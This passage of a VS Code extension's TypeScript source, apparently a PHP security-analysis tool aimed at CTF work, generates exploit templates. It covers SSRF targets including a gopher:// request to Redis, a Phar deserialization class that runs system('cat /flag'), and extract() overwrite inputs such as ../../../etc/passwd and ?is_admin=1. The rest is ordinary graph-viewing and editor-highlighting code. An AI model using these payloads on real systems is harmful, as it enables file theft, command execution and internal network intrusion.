    payload += `$ssrf8 = "file:///flag";\n\n`;
    
    payload += `// 探测内网服务\n`;
    payload += `$ssrf9 = "http://192.168.1.1/";\n`;
    payload += `$ssrf10 = "gopher://127.0.0.1:6379/_*1%0d%0a...";\n\n`;
    
    return payload;
}

function generatePharPayload(vuln: any): string {
    let payload = `/*\n`;
    payload += ` * Phar 反序列化利用\n`;
    payload += ` */\n\n`;
    
    payload += `// 步骤 1: 创建恶意 Phar 文件\n`;
    payload += `class Exploit {\n`;
    payload += `    public $cmd = "cat /flag";\n`;
    payload += `    public function __destruct() {\n`;
    payload += `        system($this->cmd);\n`;
    payload += `    }\n`;
    payload += `}\n\n`;
    
    payload += `$phar = new Phar("exploit.phar");\n`;
    payload += `$phar->startBuffering();\n`;
    payload += `$phar->addFromString("test.txt", "test");\n`;
    payload += `$phar->setStub("<?php __HALT_COMPILER(); ?>");\n`;
    payload += `$phar->setMetadata(new Exploit());\n`;
    payload += `$phar->stopBuffering();\n\n`;
    
    payload += `// 步骤 2: 上传并触发\n`;
    payload += `// 使用 phar:// 协议触发反序列化\n`;
    payload += `// ?url=phar://./uploads/exploit.phar/test.txt\n\n`;
    
    return payload;
}

function generateExtractPayload(vuln: any): string {
    let payload = `/*\n`;
    payload += ` * extract() 变量覆盖利用\n`;
    payload += ` */\n\n`;
    
    payload += `// extract() 会将数组的键值对导入为变量\n`;
    payload += `// 可以覆盖已存在的变量\n\n`;
    
    payload += `// 示例: 覆盖 $flag 变量\n`;
    payload += `// ?flag=hacked\n\n`;
    
    payload += `// 覆盖文件路径变量\n`;
    payload += `// ?file=../../../etc/passwd\n\n`;
    
    payload += `// 覆盖认证变量\n`;
    payload += `// ?is_admin=1&password=anything\n\n`;
    
    return payload;
}

async function showCodeGraph(provider: CodeGraphProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    try {
        if (!graphServer || !graphServer.isRunning()) {
            vscode.window.showErrorMessage('Graph server is not running. Please restart the extension.');
            return;
        }

        const analyzer = new PHPAnalyzer(docInfo.text);
        const graph = provider.buildCodeGraph(analyzer.getAST(), docInfo.document);
        
        // Update server with graph data
        graphServer.updateGraphData('code', graph);
        
        // Open browser
        const port = graphServer.getPort();
        const url = `http://localhost:${port}`;
        await vscode.env.openExternal(vscode.Uri.parse(url));
        
        vscode.window.showInformationMessage('Code graph opened in browser');
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error showing code graph: ${error.message}`);
    }
}

async function showInheritanceGraph(provider: CodeGraphProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    try {
        if (!graphServer || !graphServer.isRunning()) {
            vscode.window.showErrorMessage('Graph server is not running. Please restart the extension.');
            return;
        }

        const analyzer = new PHPAnalyzer(docInfo.text);
        const graph = provider.buildInheritanceGraph(analyzer.getAST(), docInfo.document);
        
        // Update server with graph data
        graphServer.updateGraphData('inheritance', graph);
        
        // Also update code graph for reference
        const codeGraph = provider.buildCodeGraph(analyzer.getAST(), docInfo.document);
        graphServer.updateGraphData('code', codeGraph);
        
        // Open browser
        const port = graphServer.getPort();
        const url = `http://localhost:${port}`;
        await vscode.env.openExternal(vscode.Uri.parse(url));
        
        vscode.window.showInformationMessage('Inheritance graph opened in browser');
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error showing inheritance graph: ${error.message}`);
    }
}

async function showDataFlowGraph(provider: CodeGraphProvider) {
    const docInfo = await getActivePhpDocument();
    if (!docInfo) {return;}

    try {
        if (!graphServer || !graphServer.isRunning()) {
            vscode.window.showErrorMessage('Graph server is not running. Please restart the extension.');
            return;
        }

        const analyzer = new PHPAnalyzer(docInfo.text);
        const graph = provider.buildDataFlowGraph(analyzer.getAST(), docInfo.document);
        
        // Update server with graph data
        graphServer.updateGraphData('dataflow', graph);
        graphServer.setCurrentFilePath(docInfo.document.uri.fsPath);
        
        // Also update code graph for reference
        const codeGraph = provider.buildCodeGraph(analyzer.getAST(), docInfo.document);
        graphServer.updateGraphData('code', codeGraph);
        
        // Open browser
        const port = graphServer.getPort();
        const url = `http://localhost:${port}`;
        await vscode.env.openExternal(vscode.Uri.parse(url));
        
        vscode.window.showInformationMessage('Data flow graph opened in browser');
    } catch (error: any) {
        vscode.window.showErrorMessage(`Error showing data flow graph: ${error.message}`);
    }
}

/**
 * Highlight a specific line in VS Code editor
 * Called when user clicks on a node in the web graph viewer
 */
async function highlightInEditor(filePath: string, line: number, column: number = 0) {
    try {
        // Find or open the file
        let document: vscode.TextDocument | undefined;
        
        // Try to find already open document
        for (const doc of vscode.workspace.textDocuments) {
            if (doc.uri.fsPath === filePath || doc.uri.fsPath.endsWith(filePath)) {
                document = doc;
                break;
            }
        }
        
        // If not found, try to open it
        if (!document && filePath) {
            try {
                document = await vscode.workspace.openTextDocument(filePath);
            } catch (e) {
                // Try with workspace folder
                const workspaceFolders = vscode.workspace.workspaceFolders;
                if (workspaceFolders && workspaceFolders.length > 0) {
                    const fullPath = vscode.Uri.joinPath(workspaceFolders[0].uri, filePath);
                    document = await vscode.workspace.openTextDocument(fullPath);
                }
            }
        }
        
        if (!document) {
            vscode.window.showWarningMessage(`Could not find file: ${filePath}`);
            return;
        }
        
        // Show the document
        const editor = await vscode.window.showTextDocument(document, {
            preview: false,
            viewColumn: vscode.ViewColumn.One
        });
        
        // Line from php-parser and web UI is 1-based
        // VS Code uses 0-based line numbers
        // Make sure we stay within document bounds
        const lineIndex = Math.max(0, Math.min(line, document.lineCount) - 1);
        const position = new vscode.Position(lineIndex, column);
        
        // Create range for the entire line
        const lineRange = document.lineAt(lineIndex).range;
        
        // Set selection and reveal
        editor.selection = new vscode.Selection(position, position);
        editor.revealRange(lineRange, vscode.TextEditorRevealType.InCenter);
        
        // Apply highlight decoration
        editor.setDecorations(highlightDecorationType, [lineRange]);
        
        // Log for debugging
        console.log(`Highlighting: input line=${line}, 0-based index=${lineIndex}, file=${filePath}`);
        
        // Remove highlight after 3 seconds
        setTimeout(() => {
            editor.setDecorations(highlightDecorationType, []);
        }, 3000);
        
        console.log(`Highlighted line ${line} in ${filePath}`);
        
    } catch (error: any) {
        console.error('Error highlighting:', error);
        vscode.window.showErrorMessage(`Failed to highlight: ${error.message}`);
    }
}

export function deactivate() {
    if (graphServer) {
        graphServer.stop();
        graphServer = null;
    }
    
    // Dispose of decoration type
    if (highlightDecorationType) {
        highlightDecorationType.dispose();
    }
}
